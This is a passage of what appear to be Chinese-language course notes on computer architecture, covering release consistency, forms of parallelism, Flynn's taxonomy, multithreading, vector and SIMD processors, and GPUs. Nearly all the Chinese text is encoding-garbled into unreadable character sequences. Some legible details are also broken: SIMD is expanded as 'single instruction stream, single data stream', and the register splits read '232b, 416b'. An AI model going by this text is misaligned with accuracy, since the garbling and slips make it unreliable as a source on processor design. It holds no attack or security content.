å’Œé‡Šæ”¾æ“ä½œ release\nacquire ç”¨äºè·å–å¯¹æŸäº›å…±äº«å­˜å‚¨å•å…ƒçš„ç‹¬å æ€§è®¿é—®æƒ release åˆ™ç”¨äºé‡Šæ”¾è¿™ç§è®¿é—®æƒ æ‰§è¡Œçš„é¡ºåºä¸ºï¼šacquire-\u0026gt; load/store -\u0026gt;release é‡Šæ”¾ä¸€è‡´æ€§æ¨¡å‹æ–½åŠ çš„é™åˆ¶\nåŒæ­¥æ“ä½œçš„æ‰§è¡Œæ»¡è¶³é¡ºåºä¸€è‡´æ€§æ¡ä»¶ åœ¨ä»»ä¸€æ™®é€šè®¿å­˜æ“ä½œå…è®¸è¢«æ‰§è¡Œä¹‹å‰ï¼Œæ‰€æœ‰åœ¨åŒä¸€å¤„ç†å™¨ä¸­å…ˆäºè¿™ä¸€è®¿å­˜æ“ä½œçš„Acquireæ“ä½œéƒ½å·²å®Œæˆ åœ¨ä»»ä¸€Releaseæ“ä½œå…è®¸è¢«æ‰§è¡Œä¹‹å‰ï¼Œæ‰€æœ‰åœ¨åŒä¸€å¤„ç†æœºä¸­å…ˆäºè¿™ä¸€Releaseçš„æ™®é€šè®¿å­˜æ“ä½œéƒ½å·²å®Œæˆ æ³¨æ„, è¿™å…¶ä¸­ä»»æ„ä¸€ä¸ªæ“ä½œ, éƒ½åªä¿è¯äº†ä¸€åŠçš„é¡ºåº:\nå¯¹äºAcquireæ¥è¯´, å¹¶æ²¡ä¿è¯Acquireå‰çš„è¯»å†™æ“ä½œä¸ä¼šå‘ç”Ÿåœ¨AcquireåŠ¨ä½œä¹‹å. å¯¹äºReleaseæ¥è¯´, å¹¶æ²¡ä¿è¯Releaseåçš„è¯»å†™æ“ä½œä¸ä¼šå‘ç”Ÿåœ¨ReleaseåŠ¨ä½œä¹‹å‰. å››ã€å¤šçº¿ç¨‹ å¹¶è¡Œçš„åˆ†ç±» æŒ‡ä»¤çº§å¹¶è¡Œï¼ˆILP Instruction-level Parallelismï¼‰ å®šä¹‰ï¼šåœ¨å•ä¸ªå¤„ç†å™¨ä¸ŠåŒæ—¶æ‰§è¡Œå¤šæ¡æŒ‡ä»¤çš„èƒ½åŠ› å®ç°æ–¹å¼ï¼šé€šè¿‡åœ¨ä¸€ä¸ªæ—¶é’Ÿå‘¨æœŸå†…æ‰§è¡Œå¤šä¸ªæŒ‡ä»¤çš„éƒ¨åˆ†ï¼Œä¾‹å¦‚æµæ°´çº¿å¤„ç†ã€è¶…æ ‡é‡å¤„ç†å’Œä¹±åºæ‰§è¡Œç­‰æŠ€æœ¯ æ•°æ®çº§å¹¶è¡Œï¼ˆDLP Data-level Parallelismï¼‰ å®šä¹‰ï¼šåŒæ—¶å¤„ç†å¤šä¸ªæ•°æ®å…ƒç´ çš„èƒ½åŠ› å®ç°æ–¹å¼ï¼šé€šè¿‡å‘é‡å¤„ç†å™¨ã€SIMDï¼ˆå•æŒ‡ä»¤å¤šæ•°æ®ï¼‰æ¶æ„ç­‰æŠ€æœ¯ï¼Œåœ¨å•ä¸ªæŒ‡ä»¤ä¸‹å¹¶è¡Œå¤„ç†å¤šä¸ªæ•°æ®å…ƒç´  çº¿ç¨‹çº§å¹¶è¡Œï¼ˆ TLP Thread-level Parallelism ï¼‰ å®šä¹‰ï¼šä»»åŠ¡è¢«ç»„ç»‡æˆå¤šä¸ªçº¿ç¨‹ï¼Œåœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸­åŒæ—¶æ‰§è¡Œå¤šä¸ªçº¿ç¨‹çš„èƒ½åŠ› å®ç°æ–¹å¼ï¼šé€šè¿‡å¤šæ ¸å¤„ç†å™¨ã€å¤šå¤„ç†å™¨ç³»ç»Ÿæˆ–è€…é€šè¿‡è¶…çº¿ç¨‹æŠ€æœ¯ï¼Œåœ¨ä¸åŒçš„æ‰§è¡Œå•å…ƒä¸Šå¹¶è¡Œæ‰§è¡Œå¤šä¸ªçº¿ç¨‹ ç³»ç»Ÿç»“æ„çš„Flynnåˆ†ç±» å•æŒ‡ä»¤æµå•æ•°æ®æµï¼ˆSingle instruction stream, single data stream ï¼ŒSISDï¼‰\nå•å¤„ç†å™¨æ¨¡å¼ï¼Œä¸€æ¡æŒ‡ä»¤å¤„ç†ä¸€æ¡æ•°æ® å•æŒ‡ä»¤æµå¤šæ•°æ®æµï¼ˆSingle instruction stream, single data stream ï¼ŒSIMDï¼‰\nç›¸åŒçš„æŒ‡ä»¤ä½œç”¨åœ¨ä¸åŒçš„æ•°æ®ï¼Œå¸¸ç”¨è¯­æŒ–æ˜DLP å¤šæŒ‡ä»¤æµå•æ•°æ®æµï¼ˆMultiple instruction streams, single data streamï¼ŒMISDï¼‰\nNo commercial implementationï¼Œå¤šç”¨äºå®¹é”™ç³»ç»Ÿ å¤šæŒ‡ä»¤æµå¤šæ•°æ®æµï¼ˆMultiple instruction streams, multiple data streamsï¼ŒMIMDï¼‰\nå¤šä¸ªå¤„ç†å™¨åŒæ—¶æ‰§è¡Œä¸åŒçš„æŒ‡ä»¤ï¼ŒåŒæ—¶æ“ä½œä¸åŒçš„æ•°æ®æµ é€šç”¨æ€§æœ€å¼ºçš„ä¸€ç§ç»“æ„ï¼Œå¯ç”¨æ¥æŒ–æ˜çº¿ç¨‹çº§å¹¶è¡Œã€æ•°æ®çº§å¹¶è¡Œâ€¦ æŒ‡ä»¤çº§å¹¶è¡Œï¼ˆILPï¼‰ï¼šæ— å…³çš„æŒ‡ä»¤é‡å æ‰§è¡Œ å¸¸è§æŠ€æœ¯ï¼šæµæ°´çº¿å¤„ç†\nä¾èµ–å…³ç³»ã€æ•°æ®å†²çªå’Œæ§åˆ¶ç›¸å…³æ€§ç­‰é—®é¢˜å¯èƒ½å¯¼è‡´ä¸€äº›æŒ‡ä»¤æ— æ³•åŒæ—¶æ‰§è¡Œ\né€šè¿‡å‡å°‘æ•°æ®ç›¸å…³å’Œæ§åˆ¶ç›¸å…³ï¼Œä½¿å¾—CPI = 1( CPIæ¥è¿‘1ï¼‰ï¼Œæ˜¯å¦èƒ½å¤Ÿä½¿CPI\u0026lt;1ï¼Ÿ\nä¸¤ç§åŸºæœ¬æ–¹æ³•ï¼šSuperscalarã€VLIW\nSuperscalar: ç‰¹ç‚¹ï¼šå…·æœ‰å¤šä¸ªæ‰§è¡Œå•å…ƒï¼Œèƒ½å¤Ÿåœ¨åŒä¸€æ—¶é’Ÿå‘¨æœŸå†…åŒæ—¶å‘å°„å’Œæ‰§è¡Œå¤šæ¡æŒ‡ä»¤ ç¡¬ä»¶ç»“æ„å¤æ‚ï¼šéœ€è¦æ”¯æŒåŠ¨æ€è°ƒåº¦å’Œå¤„ç†æŒ‡ä»¤ä¹‹é—´çš„ç›¸å…³æ€§ IBM PowerPC, Sun UltraSparc, DEC Alpha, HP 8000 è¯¥æ–¹æ³•å¯¹ç›®å‰é€šç”¨è®¡ç®—æ˜¯æœ€æˆåŠŸçš„æ–¹æ³• Very Long Instruction Words (VLIWï¼‰ ç‰¹ç‚¹ï¼šæ¯ä¸ªæ—¶é’Ÿå‘¨æœŸæµå‡ºçš„æŒ‡ä»¤æ•°æ˜¯å›ºå®šçš„ ç¡¬ä»¶ç»“æ„ç®€å•ï¼šæŒ‡ä»¤çš„æ‰§è¡Œé¡ºåºåœ¨ç¼–è¯‘æ—¶å·²çŸ¥ï¼Œå¤„ç†å™¨åªéœ€è¦é™æ€è°ƒåº¦é€»è¾‘ å¯¹äºå¤§å¤šæ•°åº”ç”¨ï¼Œå¤§å¤šæ•°æ‰§è¡Œå•å…ƒåœ¨è¶…æ ‡é‡å¤„ç†å™¨ä¸­å¤„äºç©ºé—²çŠ¶æ€ï¼Œå¤„ç†å™¨çš„æœ‰æ•ˆåˆ©ç”¨ç‡ä¸è¶³20%ï¼\nå¤šçº¿ç¨‹ï¼ˆMultithreadingï¼‰ èƒŒæ™¯ï¼šéš¾ä»¥ä»å•ä¸€çº¿ç¨‹æ§åˆ¶åºåˆ—ä¸­æå–æŒ‡ä»¤çº§å¹¶è¡Œï¼ˆILPï¼‰å’Œæ•°æ®çº§å¹¶è¡Œï¼ˆDLPï¼‰\nå‰æï¼šè®¸å¤šå·¥ä½œè´Ÿè½½å¯ä»¥ä½¿ç”¨çº¿ç¨‹çº§å¹¶è¡Œæ¥å®Œæˆï¼ˆTLPï¼‰\nåŸºæœ¬æ€æƒ³ï¼šå¤šçº¿ç¨‹ä½¿ç”¨TLPæ¥æé«˜å•ä¸ªå¤„ç†å™¨çš„åˆ©ç”¨ç‡ã€‚é’ˆå¯¹å•ä¸ªå¤„ç†å™¨ï¼šå¤šä¸ªçº¿ç¨‹ä»¥é‡å æ–¹å¼å…±äº«å•ä¸ªå¤„ç†å™¨çš„åŠŸèƒ½å•å…ƒ\nå¤šçº¿ç¨‹ç­–ç•¥ å¦‚ä½•ä¿è¯ä¸€æ¡æµæ°´çº¿ä¸Šçš„æŒ‡ä»¤ä¹‹é—´ä¸å­˜åœ¨æ•°æ®ä¾èµ–å…³ç³»ï¼Ÿ åœ¨ç›¸åŒçš„æµæ°´çº¿ä¸­äº¤å‰æ‰§è¡Œæ¥è‡ªä¸åŒçº¿ç¨‹çš„æŒ‡ä»¤ å¤šçº¿ç¨‹å¤„ç†å™¨åˆ†ç±» Chip Multiprocessingï¼ˆCMPï¼‰ Coarse-Grain Multithreading Fine-Grain Multithreading Simultaneous Multithreading Chip Multiprocessingï¼ˆCMPï¼‰\nåŒä¸€æ—¶é’Ÿå‘¨æœŸå¯ä»¥è¿è¡Œä¸åŒçº¿ç¨‹çš„æŒ‡ä»¤ ç”±äºå‘å°„å®½åº¦åœ¨æ ¸é—´è¿›è¡Œäº†é™æ€åˆ†é…ï¼Œå¯¼è‡´æ—¶é—´å’Œç©ºé—´ç»´åº¦æµªè´¹å‡å°‘ ç²—ç²’åº¦å¤šçº¿ç¨‹ï¼ˆCoarse-Grained MTï¼‰\nå½“çº¿ç¨‹è¿è¡Œæ—¶å­˜åœ¨è¾ƒé•¿æ—¶é—´å»¶æ—¶æ—¶ï¼Œåˆ‡æ¢åˆ°å¦ä¸€çº¿ç¨‹ï¼Œä¾‹å¦‚ï¼šcacheå¤±æ•ˆæ—¶ï¼Œçº¿ç¨‹ç­‰å¾…åŒæ­¥ç»“æŸã€‚ æ¯éš”å‡ ä¸ªå‘¨æœŸåœ¨çº¿ç¨‹ä¹‹é—´è¿›è¡Œä¸€æ¬¡ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œéšè—è¾ƒé•¿çš„stall ä¼˜ç‚¹ï¼šçº¿ç¨‹é—´åˆ‡æ¢é€Ÿåº¦å¿«\u0026lt;10cycle ç¼ºç‚¹ï¼šæ— æ³•åº”å¯¹çº¿ç¨‹é—´æœ‰å¾ˆå¤šå°çš„stall ç»†ç²’åº¦å¤šçº¿ç¨‹ï¼ˆFine-Grained MTï¼‰\nå¤šä¸ªçº¿ç¨‹çš„æŒ‡ä»¤äº¤å‰æ‰§è¡Œ,æ¯ä¸ªå‘¨æœŸåœ¨çº¿ç¨‹ä¹‹é—´è¿›è¡Œä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œå³ä½¿çº¿ç¨‹å¯ä»¥è¿ç»­æ‰§è¡Œ çº¿ç¨‹åˆ‡æ¢çš„é¢‘ç‡é«˜ã€å‘¨æœŸçŸ­ ç‰ºç‰²å•çº¿ç¨‹æ‰§è¡Œæ€§èƒ½ï¼Œæ¢å–å¤šçº¿ç¨‹ååé‡çš„æå‡ åŒæ­¥å¤šçº¿ç¨‹ï¼ˆSimultaneous Multithreading (SMT)ï¼‰\nSMT ä½¿ç”¨OoO Superscalarç»†ç²’åº¦æ§åˆ¶æŠ€æœ¯åœ¨ç›¸åŒæ—¶é’Ÿå‘¨æœŸè¿è¡Œå¤šä¸ªçº¿ç¨‹çš„æŒ‡ä»¤ï¼Œä»¥æ›´å¥½çš„åˆ©ç”¨ç³»ç»Ÿèµ„æº æ›´å¥½çš„èµ„æºåˆ©ç”¨ï¼šå¤šä¸ªçº¿ç¨‹å¯ä»¥å…±äº«åŒä¸€ä¸ªæ ¸å¿ƒçš„æ‰§è¡Œèµ„æº éšè—å†…å­˜å»¶è¿Ÿï¼šå½“ä¸€ä¸ªçº¿ç¨‹åœ¨ç­‰å¾…å†…å­˜è®¿é—®æ—¶ï¼Œå…¶ä»–çº¿ç¨‹çš„æŒ‡ä»¤å¯ä»¥åœ¨åŒä¸€æ ¸å¿ƒä¸Šç»§ç»­æ‰§è¡Œï¼Œä»è€Œå‡å°‘äº†å†…å­˜è®¿é—®çš„å»¶è¿Ÿå¯¹æ•´ä½“æ€§èƒ½çš„å½±å“ æ›´å¥½çš„å“åº”æ—¶é—´ï¼š SMTæœ‰åŠ©äºæé«˜ç³»ç»Ÿå¯¹å¤šä»»åŠ¡å·¥ä½œè´Ÿè½½çš„å“åº”æ—¶é—´ï¼Œå› ä¸ºå¯ä»¥åŒæ—¶æ‰§è¡Œå¤šä¸ªçº¿ç¨‹ å¹¶è¡Œè®¡ç®— äº”ã€SIMDå’Œå‘é‡å¤„ç†å™¨ åŠ¨æœºï¼šä¼ ç»ŸæŒ‡ä»¤çº§å¹¶è¡ŒæŠ€æœ¯çš„é—®é¢˜\næé«˜æ€§èƒ½çš„ä¼ ç»Ÿæ–¹æ³•ï¼ˆæŒ–æ˜æŒ‡ä»¤çº§å¹¶è¡Œï¼‰çš„ä¸»è¦ç¼ºé™·ï¼š\nç¨‹åºå†…åœ¨çš„å¹¶è¡Œæ€§ï¼Œæœ‰äº›ç¨‹åºä¸å…·å¤‡è¶³å¤Ÿçš„å¹¶è¡Œæ€§ æé«˜æµæ°´çº¿çš„æ—¶é’Ÿé¢‘ç‡ï¼Œæé«˜æ—¶é’Ÿé¢‘ç‡æœ‰æ—¶å€™ä¼šå¯¼è‡´CPIçš„å¢åŠ  æŒ‡ä»¤é¢„å–å’Œè¯‘ç ï¼Œæœ‰æ—¶å€™åœ¨æ¯ä¸ªæ—¶é’Ÿå‘¨æœŸå¾ˆéš¾é¢„å–å’Œè¯‘ç å¤šæ¡æŒ‡ä»¤ æé«˜Cacheçš„å‘½ä¸­ç‡ï¼Œåœ¨æœ‰äº›è®¡ç®—é‡è¾ƒå¤§çš„åº”ç”¨ï¼ˆå¦‚ç§‘å­¦è®¡ç®—ï¼‰ä¸­ï¼Œéœ€è¦å¤§é‡çš„æ•°æ®ï¼Œå…¶å±€éƒ¨æ€§è¾ƒå·®ï¼›æœ‰äº›ç¨‹åºå¤„ç†çš„æ˜¯è¿ç»­çš„åª’ä½“æµï¼ˆmultimediaï¼‰ï¼Œå…¶å±€éƒ¨æ€§ä¹Ÿè¾ƒå·® SIMDçš„ä¼˜åŠ¿\nå›¾å½¢ã€æœºå™¨è§†è§‰ã€è¯­éŸ³è¯†åˆ«ã€æœºå™¨å­¦ä¹ ç­‰æ–°çš„åº”ç”¨å‡éœ€è¦å¤§é‡çš„æ•°å€¼è®¡ç®—ï¼Œå…¶ç®—æ³•é€šå¸¸å…·æœ‰æ•°æ®å¹¶è¡Œç‰¹å¾ï¼Œè€ŒSIMD-basedç»“æ„ï¼ˆvector-SIMDï¼ŒSIMD/GPUsï¼‰æ˜¯æ‰§è¡Œè¿™äº›ç®—æ³•çš„æœ€æœ‰æ•ˆé€”å¾„ SIMDç»“æ„å¯æœ‰æ•ˆåœ°æŒ–æ˜æ•°æ®çº§å¹¶è¡Œ SIMDæ¯”MIMDæ›´èŠ‚èƒ½ SIMDå…è®¸ç¨‹åºå‘˜ç»§ç»­ä»¥ä¸²è¡Œæ¨¡å¼æ€è€ƒ SIMDçš„ä¸‰ç§å˜ä½“\nå‘é‡ä½“ç³»ç»“æ„\nSIMD/MultimediaæŒ‡ä»¤çº§æ‰©å±•\nGraphics Processor Units (GPUs)\nå‘é‡å¤„ç†å™¨æ¨¡å‹ å‘é‡å¤„ç†å™¨å…·æœ‰æ›´é«˜å±‚æ¬¡çš„æ“ä½œï¼Œä¸€æ¡å‘é‡æŒ‡ä»¤å¯ä»¥åŒæ—¶å¤„ç†Nä¸ªæˆ–Nå¯¹æ“ä½œæ•°ï¼ˆå¤„ç†å¯¹è±¡æ˜¯å‘é‡ï¼‰\nå‘é‡å¤„ç†å™¨çš„åŸºæœ¬ç‰¹å¾\nåŸºæœ¬æ€æƒ³ï¼šä¸¤ä¸ªå‘é‡çš„å¯¹åº”åˆ†é‡è¿›è¡Œè¿ç®—ï¼Œäº§ç”Ÿä¸€ä¸ªç»“æœå‘é‡ ç®€å•çš„ä¸€æ¡å‘é‡æŒ‡ä»¤åŒ…å«äº†å¤šä¸ªæ“ä½œ -\u0026gt; fewer instruction fetches æ¯ä¸€æ¡ç»“æœç‹¬ç«‹äºå‰é¢çš„ç»“æœ é•¿æµæ°´çº¿ï¼Œç¼–è¯‘å™¨ä¿è¯æ“ä½œé—´æ²¡æœ‰ç›¸å…³æ€§ ç¡¬ä»¶ä»…éœ€æ£€æµ‹ä¸¤æ¡å‘é‡æŒ‡ä»¤é—´çš„ç›¸å…³æ€§ è¾ƒé«˜çš„æ—¶é’Ÿé¢‘ç‡ å‘é‡æŒ‡ä»¤ä»¥å·²çŸ¥çš„æ¨¡å¼è®¿é—®å­˜å‚¨å™¨ å¯æœ‰æ•ˆå‘æŒ¥å¤šä½“äº¤å‰å­˜å‚¨å™¨çš„ä¼˜åŠ¿ ä¸éœ€è¦æ•°æ®Cacheï¼ˆä»…ä½¿ç”¨æŒ‡ä»¤Cacheï¼‰ åœ¨æµæ°´çº¿æ§åˆ¶ä¸­å‡å°‘äº†æ§åˆ¶Hazard æœ‰æ•ˆåˆ©ç”¨æµæ°´çº¿å¹¶å‘æ‰§è¡ŒæŒ‡ä»¤ å‘é‡å¤„ç†å™¨çš„åŸºæœ¬ç»“æ„\nmemory-memory vector processorsï¼ˆå­˜å‚¨å™¨å‹ï¼‰\næ‰€æœ‰çš„å‘é‡æ“ä½œéƒ½æ˜¯å­˜å‚¨å™¨åˆ°å­˜å‚¨å™¨\néœ€è¦æ›´é«˜çš„å­˜å‚¨å¸¦å®½\nå¤šä¸ªå‘é‡æ“ä½œé‡å æ‰§è¡Œè¾ƒä¸ºå›°éš¾\nå¯åŠ¨æ—¶é—´å¾ˆé•¿\nCDC Star-100 åœ¨å‘é‡å…ƒç´ å°äº100æ—¶ï¼Œæ ‡é‡ä»£ç çš„æ€§èƒ½é«˜äºå‘é‡åŒ–ä»£ç  vector-register processorsï¼ˆå¯„å­˜å™¨å‹ï¼‰\nLoad/Storeä½“ç³»ç»“æ„ é™¤äº†Loadå’Œstoreæ“ä½œå¤–ï¼Œæ‰€æœ‰çš„æ“ä½œæ˜¯å‘é‡å¯„å­˜å™¨ä¸å‘é‡å¯„å­˜å™¨çš„æ“ä½œï¼ˆç›®å‰çš„å‘é‡å¤„ç†å™¨éƒ½æ˜¯è¿™ç§ç»“æ„ï¼‰ å‘é‡å¤„ç†å™¨çš„åŸºæœ¬ç»„æˆå•å…ƒ\n**Vector Registerï¼š**å›ºå®šé•¿åº¦çš„ä¸€å—åŒºåŸŸï¼Œå­˜æ”¾å•ä¸ªå‘é‡\nè‡³å°‘2ä¸ªè¯»ç«¯å£å’Œ1ä¸ªå†™ç«¯å£ï¼ˆä¸€èˆ¬æœ€å°‘16ä¸ªè¯»ç«¯å£ï¼Œ8ä¸ªå†™ç«¯å£ï¼‰\nå…¸å‹çš„æœ‰8-32ä¸ªå‘é‡å¯„å­˜å™¨ï¼Œæ¯ä¸ªå¯„å­˜å™¨é•¿åº¦ä¸º32ã€64ç­‰\n**Vector Functional Units (FUs)ï¼š**å…¨æµæ°´åŒ–çš„ï¼Œæ¯ä¸€ä¸ªclockå¯åŠ¨ä¸€ä¸ªæ–°çš„æ“ä½œ\nä¸€èˆ¬4åˆ°8ä¸ªFUsï¼šFP addï¼ŒFP multï¼ŒFP reciprocal (1/X)ï¼Œinteger addï¼Œlogicalï¼Œshiftï¼›å¯èƒ½æœ‰äº›é‡å¤è®¾ç½®çš„éƒ¨ä»¶ **Vector Load-Store Units (LSUs)ï¼š**å…¨æµæ°´åŒ–åœ°loadæˆ–storeä¸€ä¸ªå‘é‡ï¼Œå¯èƒ½ä¼šé…ç½®å¤šä¸ªLSUéƒ¨ä»¶\n**Scalar registersï¼š**å­˜æ”¾å•ä¸ªå…ƒç´ ç”¨äºæ ‡é‡å¤„ç†æˆ–å­˜å‚¨åœ°å€\nç”¨äº¤å‰å¼€å…³è¿æ¥ï¼ˆCross-barï¼‰FUsï¼Œ LSUsï¼Œ registers å‘é‡æŒ‡ä»¤é›†çš„ä¼˜åŠ¿\næ ¼å¼ç´§å‡‘ä¸€è·³æŒ‡ä»¤åŒ…å«Nä¸ªæ“ä½œ è¡¨è¾¾èƒ½åŠ›å¼ºï¼Œä¸€æ¡æŒ‡ä»¤èƒ½å‘Šè¯‰ç¡¬ä»¶è¯¸å¤šä¿¡æ¯ Nä¸ªæ“ä½œä¹‹é—´æ— ç›¸å…³æ€§ ä½¿ç”¨åŒæ ·çš„åŠŸèƒ½éƒ¨ä»¶ è®¿é—®ä¸ç›¸äº¤çš„å¯„å­˜å™¨ ä¸å‰é¢çš„æ“ä½œä»¥ç›¸åŒæ¨¡å¼è®¿é—®å¯„å­˜å™¨ è®¿é—®å­˜å‚¨å™¨ä¸­çš„è¿ç»­å— (unit-stride load/store) ä»¥å·²çŸ¥çš„æ¨¡å¼è®¿é—®å­˜å‚¨å™¨ (strided load/store) å¯æ‰©å±•æ€§å¥½ æ”¯æŒåœ¨å¤šä¸ªå¹¶è¡Œçš„æµæ°´çº¿ä¸Šè¿è¡ŒåŒæ ·çš„ä»£ç  å‘é‡å¤„ç†å™¨çš„ç¼ºç‚¹å’Œç“¶é¢ˆ\nå½“å¹¶è¡Œä¸è§„åˆ™çš„æ—¶å€™ï¼Œå‘é‡å¤„ç†å™¨å°±ä¼šæ˜¾å¾—æ•ˆç‡éå¸¸ä½æ¯”å¦‚æœç´¢ä¸€ä¸ªé“¾è¡¨ä¸­çš„keyï¼Œå¤§å®¶å¯ä»¥æƒ³è±¡ä¸€ä¸‹å‘é‡å¤„ç†å™¨åº”è¯¥æ€ä¹ˆè¿ç®—ï¼Œå®é™…ä¸Šæ­¤æ—¶çº¦ç­‰äºæ ‡é‡å¤„ç†å™¨ï¼Œæµªè´¹äº†å¤§é‡éƒ¨ä»¶ã€‚è¿™ä¸€ç¼ºç‚¹å’ŒVLIWæœ‰ç±»ä¼¼ä¹‹å¤„ï¼Œå½“æ‰¾ä¸åˆ°é‚£ä¹ˆå¤šå¹¶è¡Œçš„è¿ç®—çš„æ—¶å€™ï¼Œæ•ˆç‡è‡ªç„¶ä¼šé™ä½ã€‚ å‘é‡å¤„ç†å™¨æœ€å…¸å‹çš„æ€§èƒ½ç“¶é¢ˆå°±æ˜¯Memoryï¼ˆBandwithï¼‰ã€‚ 1ã€è¿ç®—å’Œå†…å­˜æ“ä½œçš„æ¯”ä¾‹æ²¡æŒæ§å¥½çš„æƒ…å†µï¼ˆæ¯”å¦‚å®é™…è¿ç®—é‡å¾ˆå°‘ï¼Œå†…å­˜æ“ä½œè¿‡å¤šï¼‰ 2ã€æ•°æ®æ²¡æœ‰æ”¾åœ¨å¤šä¸ªMemory Bankå½“ä¸­ å‘é‡å¤„ç†å™¨å•å…ƒç»“æ„\né‡‡ç”¨å¤šæµæ°´çº¿laneè®¾è®¡ laneï¼šåŒ…å«å‘é‡å¯„å­˜å™¨å †çš„ä¸€éƒ¨åˆ†å’Œæ¥è‡ªæ¯ä¸ªå‘é‡åŠŸèƒ½å•å…ƒçš„ä¸€ä¸ªæ‰§è¡Œæµæ°´çº¿ å¯¹äºå¯ä»¥å­˜å‚¨64ä¸ªå…ƒç´ çš„å¯„å­˜å™¨ï¼Œ6æ®µä¹˜æ³•æµæ°´çº¿ï¼Œè®¡ç®—V3éœ€è¦å¤šä¹…ï¼Ÿ T=æµæ°´çº¿å¯åŠ¨æ—¶é—´+N=6+63=69cycles å‘é‡æŒ‡ä»¤æ‰§è¡Œ\nMemory Banking ç‹¬ç«‹å­˜å‚¨ä½“æ–¹å¼ï¼šç”±å¤šä¸ªäº’ç›¸ç‹¬ç«‹çš„å­˜å‚¨ä½“ï¼ˆBankï¼‰æ„æˆå­˜å‚¨å™¨ç»„ç»‡ å¯ç‹¬ç«‹è®¿é—®å­˜å‚¨å™¨ï¼Œå„å­˜å‚¨å™¨å…±äº«æ•°æ®å’Œåœ°å€æ€»çº¿ï¼ˆminimize pin costï¼‰ æ¯ä¸ªå‘¨æœŸå¯åŠ¨å’Œå®Œæˆä¸€ä¸ªbankçš„è®¿é—® å¦‚æœNä¸ªå­˜å‚¨å™¨è®¿é—®ä¸åŒçš„bankå¯ä»¥å¹¶è¡Œæ‰§è¡Œ Interleaved Vector Memory System\nBANKçš„æ•°é‡è¦å¤§äºç­‰Bank busy timeï¼ˆbankå‡†å¤‡å¥½æ¥æ”¶ä¸‹ä¸€ä¸ªè¯·æ±‚ä¹‹å‰çš„æ—¶é—´ï¼‰ å…è®¸Nä¸ªå¹¶è¡Œï¼ˆå¦‚æœæ•°æ®åœ¨ä¸åŒçš„bankä¸­ï¼‰ Vector Opt #1: Vector Chainingï¼ˆç›¸å½“äºVectorä¸­çš„forwardingï¼‰\nVector Opt #2: Conditional Execution\né€šè¿‡å¢åŠ å‘é‡æ©ç ï¼ˆæ ‡å¿—ï¼‰å¯„å­˜å™¨å’Œå¯å±è”½å‘é‡æŒ‡ä»¤å¯¹ä½¿ç”¨æ¡ä»¶è¯­å¥çš„å¾ªç¯è¿›è¡ŒçŸ¢é‡åŒ– vector-mask control ä½¿ç”¨é•¿åº¦ä¸ºMVLçš„å¸ƒå°”å‘é‡æ§åˆ¶å‘é‡æŒ‡ä»¤çš„æ‰§è¡Œ å‘é‡è¿ç®—åœ¨æ©ç ä½ä¸º0çš„å…ƒç´ å¤„å˜ä¸ºNOP ï¼Œå³ä»…å¯¹vector-mask registerå¯¹åº”ä½ä¸º1 çš„åˆ†é‡èµ·ä½œç”¨ ç¼ºé™·ï¼š ç®€å•å®ç°æ—¶ï¼Œæ¡ä»¶ä¸æ»¡è¶³æ—¶å‘é‡æŒ‡ä»¤ä»ç„¶éœ€è¦èŠ±è´¹æ—¶é—´ æœ‰äº›å‘é‡å¤„ç†å™¨é’ˆå¯¹å¸¦æ¡ä»¶çš„å‘é‡æ‰§è¡Œæ—¶ï¼Œä»…æ§åˆ¶å‘ç›®æ ‡å¯„å­˜å™¨çš„å†™æ“ä½œï¼Œå¯èƒ½ä¼šæœ‰é™¤æ³•é”™è¯¯ Vector Opt #3: åˆ†æ®µå¼€é‡‡ï¼ˆStrip miningï¼‰\nå°†å¾ªç¯æ‹†è§£æˆé€‚åˆå¯„å­˜å™¨çš„ç‰‡æ®µ -\u0026gt; Strip miningæ¥è§£å†³æ“ä½œçš„å‘é‡é•¿åº¦å¤§äºå‘é‡å¯„å­˜å™¨é•¿åº¦çš„é—®é¢˜ æ¯”å¦‚æœ‰527ä¸ªå…ƒç´ ï¼Œå‘é‡å¯„å­˜å™¨åªæœ‰64ä¸ªElementsï¼Œå³æœ€å¤§å¹¶è¡Œåº¦åªæœ‰64ï¼Œæ­¤æ—¶é€šè¿‡8æ¬¡è¿­ä»£å³å¯ Array Processors vs Vector Processors\nArray Processorï¼Œåˆç§°ä¸ºå¹¶è¡Œå¤„ç†æœºï¼Œä¸€ä¸ªcycleå¯ä»¥åŒæ—¶è®¡ç®—å¤šç»„å…ƒç´ ï¼Œä¹Ÿå°±æ˜¯å¹¶è¡Œã€‚ Vector Processoréœ€è¦å¯¹å‘é‡åŠŸèƒ½å•å…ƒoutstandingæˆæµæ°´çº¿ï¼Œæœ¬æ–‡ç”¨çš„æ˜¯Vector Processor SIMD/Multimediaæ‰©å±•\nåœ¨å·²æœ‰ISAä¸­æ·»åŠ ä¸€äº›å‘é‡é•¿åº¦å¾ˆçŸ­çš„å‘é‡æ“ä½œæŒ‡ä»¤ å°†å·²æœ‰çš„64-bitå¯„å­˜å™¨æ‹†åˆ†ä¸º232bã€416bã€8*8b å•æ¡æŒ‡ä»¤å¯å®ç°å¯„å­˜å™¨ä¸­æ‰€æœ‰å‘é‡å…ƒç´ çš„æ“ä½œ å…­ã€GPU GPUæ¦‚è¿° 21ä¸–çºªä»¥æ¥ï¼šæ—¶é’Ÿé¢‘ç‡ã€å•æ ¸çš„æ€§èƒ½å¢åŠ æœ‰é™ï¼›æ€§èƒ½æå‡ä¸»è¦ä¾èµ–äºå•ç‰‡ä¸Šçš„â€œcoreâ€çš„æ•°é‡ï¼›éœ€è¦æ¢ç´¢æ›´åŠ æœ‰æ•ˆçš„ç¡¬ä»¶ç»“æ„\nç‹¬ç«‹æ˜¾å¡ åŸºäºPCIeçš„åŠ é€Ÿå™¨ æ‹¥æœ‰ç‹¬ç«‹æ˜¾å­˜ é›†æˆæ˜¾å¡ ç”¨äºå¤„ç†2Då’Œ3Då›¾åƒçš„å›ºå®šåŠŸèƒ½åŠ é€Ÿå™¨ ä¸‰è§’å½¢è®¾å®šå’Œå…‰æ …åŒ–ï¼Œçº¹ç†æ˜ å°„å’Œç€è‰² ç¼–ç¨‹æ–¹å¼ï¼š OpenGL å’Œ DirectX API GPUä¸CPUçš„æ¯”è¾ƒ\nGPUçš„è®¿å­˜å¸¦å®½æ˜æ˜¾é«˜äºCPU GPUå…·æœ‰æ›´é«˜çš„èƒ½æ•ˆä¼˜åŠ¿ ä¸cpuç›¸æ¯”ï¼Œgpuæä¾›äº†æ›´é«˜çš„32ä½æµ®ç‚¹æ•°æ€§èƒ½ 